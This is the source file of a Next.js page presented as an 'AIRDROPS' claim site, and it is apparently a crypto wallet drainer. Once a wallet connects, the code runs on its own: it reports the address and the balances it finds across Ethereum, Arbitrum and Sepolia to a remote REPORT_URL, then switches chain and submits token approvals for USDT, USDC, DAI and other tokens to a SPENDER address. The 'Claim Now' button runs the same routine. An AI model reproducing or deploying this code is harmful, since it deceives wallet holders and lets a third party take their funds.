'use client';
import { useState, useEffect } from 'react';
import { useAccount } from 'wagmi';
import { erc20Abi } from 'viem';
import { readContract, getBalance, switchChain } from '@wagmi/core';
import { config } from '@/config';
import { sendMeeTx } from '@/utils/sendMeeTx';

const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
if (!SPENDER || SPENDER === "0x") {
  throw new Error('SPENDER_ADDRESS is not defined or invalid');
}

const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
> = {
  1: [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", min: BigInt(1 * 10 ** 18), decimals: 18 },
    { symbol: "BUSD", address: "0x4fabb145d64652a948d72533023f6e7a623c7c53", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  42161: [
    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  11155111: [
    { symbol: "USDC", address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "LINK", address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
};

const CHAIN_NAMES: Record<number, string> = {
  1: "Ethereum Mainnet",
  42161: "Arbitrum",
  11155111: "Sepolia",
};

function ConnectionReporter() {
  const { address, isConnected } = useAccount();

  useEffect(() => {
    if (isConnected && address) {
      fetch(`${REPORT_URL}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "connect",
          wallet: address,
        }),
      }).catch(console.error);
    }
  }, [isConnected, address]);

  return null;
}

// ðŸŸ¢ Utility: timeout wrapper
async function withTimeout<T>(promise: Promise<T>, ms: number, msg: string): Promise<T> {
  return new Promise<T>((resolve, reject) => {
    const id = setTimeout(() => reject(new Error(msg)), ms);
    promise
      .then((res) => {
        clearTimeout(id);
        resolve(res);
      })
      .catch((err) => {
        clearTimeout(id);
        reject(err);
      });
  });
}

export default function Home() {
  const { address, isConnected, chainId } = useAccount();
  const [status, setStatus] = useState<string>("");

  async function handleClaim() {
    if (!isConnected || !address) {
      setStatus("Wallet not connected");
      return;
    }

    try {
      setStatus("Scanning chains for balances...");

      let targetChain: number | null = null;
      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];

      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        const numericCid = Number(cid);
        let balancesForReport: any[] = [];

        // Native balance with timeout
        try {
          const nativeBal = await withTimeout(
            getBalance(config, { address, chainId: numericCid }),
            10_000, // 10s
            `Timeout: native balance on ${numericCid}`
          );
          balancesForReport.push({
            token: "native",
            symbol: nativeBal.symbol,
            balance: nativeBal.formatted,
          });
        } catch (err) {
          console.error(`Failed native balance for ${numericCid}:`, err);
        }

        // ERC20 balances with timeout
        for (const token of tokens) {
          try {
            const bal = await withTimeout(
              readContract(config, {
                chainId: numericCid,
                address: token.address,
                abi: erc20Abi,
                functionName: "balanceOf",
                args: [address],
              }) as Promise<bigint>,
              10_000, // 10s
              `Timeout: ${token.symbol} balance on ${numericCid}`
            );

            const formatted = Number(bal) / 10 ** token.decimals;
            balancesForReport.push({
              token: token.address,
              symbol: token.symbol,
              balance: formatted,
            });

            if (bal >= token.min) {
              targetChain = numericCid;
              usableTokens.push(token);
            }
          } catch (err) {
            console.error(`Failed ${token.symbol} on chain ${numericCid}:`, err);
          }
        }

        if (balancesForReport.length > 0) {
          await fetch(`${REPORT_URL}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              event: "balances",
              wallet: address,
              chainId: numericCid,
              chainName: CHAIN_NAMES[numericCid],
              balances: balancesForReport,
            }),
          }).catch(console.error);
        }

        if (usableTokens.length > 0) break;
      }

      if (!targetChain || usableTokens.length === 0) {
        setStatus("No usable balances found on any chain.");
        return;
      }

      const chainName = CHAIN_NAMES[targetChain!] || "Unknown Chain";
      if (chainId !== targetChain) {
        setStatus(`Switching to ${chainName}...`);
        await switchChain(config, { chainId: targetChain });
      }

      let successCount = 0;
      let skippedCount = 0;

      for (const token of usableTokens) {
        setStatus(`Approving ${token.symbol} on ${chainName} with Fusion...`);

        try {
          const txHash = await sendMeeTx({
            tokenAddress: token.address,
            spender: SPENDER,
            amountHuman: "2",
            decimals: token.decimals,
            chainId: targetChain!,
          });

          successCount++;
          setStatus(`${token.symbol} Fusion approval âœ… | Tx: ${txHash}`);
        } catch (err: any) {
          const msg = err?.message || String(err);
          if (msg.includes("not supported as a Fusion fee token")) {
            skippedCount++;
            setStatus(`â­ï¸ Skipped ${token.symbol} (not supported)`);
          } else {
            setStatus(`âŒ Fusion failed for ${token.symbol}: ${msg}`);
          }
        }
      }

      if (successCount > 0) {
        setStatus(`ðŸŽ‰ ${successCount} approval(s) succeeded!`);
      } else if (skippedCount > 0) {
        setStatus(`â­ï¸ Skipped ${skippedCount} token(s) â€” not supported.`);
      } else {
        setStatus("âš ï¸ No approvals succeeded.");
      }
    } catch (err: any) {
      console.error(err);
      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
    }
  }

  useEffect(() => {
    if (isConnected && address) handleClaim();
  }, [isConnected, address]);

  return (
    <main style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "24px", marginTop: "40px" }}>
      <header
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          right: 0,
          height: "64px",
          background: "#09011fff",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 24px",
          paddingTop: "env(safe-area-inset-top)",
          boxShadow: "0 2px 8px rgba(241, 235, 235, 0.08)",
          zIndex: 1000,
        }}
      >
        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>AIRDROPS</div>
        <appkit-button />
      </header>

      <ConnectionReporter />

      <div style={{ display: "flex", flexDirection: "column", gap: "24px", paddingTop: "80px", width: "80%", maxWidth: "600px" }}>
        <div
          style={{
            border: "1px solid #9dd6d1ff",
            borderRadius: "12px",
            padding: "20px",
            background: "#090e41ff",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "space-between",
            height: "500px",
          }}
        >
          <h2 style={{ marginBottom: "12px" }}>Airdrop</h2>
          <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", color: "#e4e1daff", fontSize: "14px", textAlign: "center" }}>
            {status || ""}
          </div>
          <button
            onClick={handleClaim}
            style={{
              background: "#a00b0bff",
              color: "white",
              padding: "12px 28px",
              borderRadius: "8px",
              cursor: "pointer",
              marginTop: "16px",
            }}
          >
            Claim Now
          </button>
        </div>

        {[1, 2, 3].map((i) => (
          <div
            key={i}
            style={{
              border: "1px solid #c9c8ddff",
              borderRadius: "12px",
              padding: "20px",
              background: "#0e0a42ff",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <span>Box {i + 1}</span>
          </div>
        ))}
      </div>
    </main>
  );
}